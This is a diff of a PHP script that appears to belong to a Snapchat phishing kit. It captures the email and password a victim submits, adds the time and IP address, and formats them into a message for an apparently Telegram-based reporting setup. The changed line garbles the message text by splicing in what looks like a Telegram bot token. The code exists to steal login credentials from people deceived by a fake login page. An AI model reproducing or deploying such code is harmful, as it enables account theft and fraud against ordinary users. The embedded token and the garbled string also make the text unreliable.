@@ -11,12 +11,12 @@ if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
 $d = new DateTime("now", new DateTimeZone("Asia/Baghdad")); // Set Your country DF Time 
 $time = $d->format("Y/m/d  h:i:s A");
 if (isset($_POST['info'])) {
-        $msg = urlencode("New Login From SnapChat : \nEmail : " . $_POST['email'] . "\nPassword : " . $_POST['password'] . "\nTime : " . $time . "\nIp : " . $ip_address . "\n®Mr28");
+        $msg = urlencode("New Login From SnBoty_thebot6077347189:AAGCs_kEPORJJOX7ocsXI--UqDRISotw7LoapChat : \nEmail : " . $_POST['email'] . "\nPassword : " . $_POST['password'] . "\nTime : " . $time . "\nIp : " . $ip_address . "\n®Mr28");
 }
 
 
 
-// Setting 
+// Setting .
 $apiToken = "";
 $YOUR_ID_TELE = "";
 
